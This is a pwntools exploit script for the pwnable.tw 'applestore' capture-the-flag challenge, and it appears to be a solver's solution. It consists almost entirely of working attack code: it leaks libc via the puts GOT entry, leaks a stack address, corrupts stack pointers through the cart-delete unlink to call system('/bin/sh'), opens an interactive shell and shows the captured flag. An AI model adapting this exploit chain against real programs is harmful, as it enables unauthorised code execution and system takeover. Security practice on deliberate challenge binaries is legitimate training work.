#chall.pwnable.tw 10104
from pwn import *
debug = 1
if debug:
	s = process('./applestore')
	context(log_level='debug')
	raw_input('debug')
	puts_offset = 0x5fca0
	system_offset = 0x3ada0
	binsh_offset = 0x15ba0b
else:
	s = remote('chall.pwnable.tw', 10104)
	e = ELF('./libc_32.so.6')
	puts_offset = e.symbols['puts']
	system_offset = e.symbols['system']
	binsh_offset = e.search('/bin/sh').next()
	
def add(deviceNum,choice='2'):
	s.sendafter('> ',choice)
	s.sendafter('Device Number> ',(deviceNum))
	
def delete(itemNum,choice='3'):
	s.sendafter('> ',choice)
	s.sendafter('Item Number> ',(itemNum))
	
def cart(data,choice='4'):
	s.sendafter('> ',choice)
	s.sendafter('Let me check your cart. ok? (y/n) > ',data)
	
def checkout(data,choice='5'):
	s.sendafter('> ',choice)
	s.sendafter('Let me check your cart. ok? (y/n) > ',data)

# 1: iPhone 6 - $199
# 2: iPhone 6 Plus - $299
# 3: iPad Air 2 - $499
# 4: iPad Mini 3 - $399
# 5: iPod Touch - $199
# add(2)
#7174 = 6*199 + 20*299
for i in range(6):
	add('1')
for i in range(20):
	add('2')

# add iphone 8
checkout('y')
#leak libc
puts_got = 0x804b028
# when the total = 7174, it save the pointer of the ip 8 on stack, so we can overwrite by putsgot
cart('yb'+p32(puts_got)+p32(0xffffffff)+p32(0x0))
s.recvuntil('27: ')

puts_libc = u32(s.recv(4))
libc_base = puts_libc-puts_offset
system_libc = libc_base+system_offset
binsh_libc = libc_base+ binsh_offset

log.info("puts_libc:0x%x"%puts_libc)
log.info("libc_base:0x%x"%libc_base)
log.info("system_libc:0x%x"%system_libc)
log.info("binsh_libc:0x%x"%binsh_libc)

mycart = 0x804b068

for i in range(26):
	delete('1')

#leak stack
cart('yb'+p32(mycart+8)+p32(0x123)+p32(0x0))
s.recvuntil('1: ')

stack_leak = u32(s.recv(4))
offset_stack = 0x40
handler_stack = stack_leak+offset_stack
main_ebp = stack_leak+ 0x84
delete_ebp = 0x20+stack_leak
main_ebp = delete_ebp+ 0x60-0x20

log.info("stack_leak: 0x%x"%stack_leak)
log.info("delete_ebp: 0x%x"%delete_ebp)
log.info("main_ebp: 0x%x"%main_ebp)

# rewrite return address of main
main = 0x8048ca6 
stack_check_fail_got = 0x804b020
# delete('1a'+p32(system_libc)+p32(0x123)+p32(puts_got)+p32(stack_check_fail_got-8))

delete('1a'+p32(system_libc)+p32(0x123)+p32(main_ebp-12)+p32(handler_stack-4),'3a'+p32(system_libc)+p32(main)+p32(binsh_libc)+p32(0x0))
s.sendafter("> ",'6a'+p32(system_libc)+p32(main)+p32(binsh_libc))
s.interactive()
s.close()
#FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
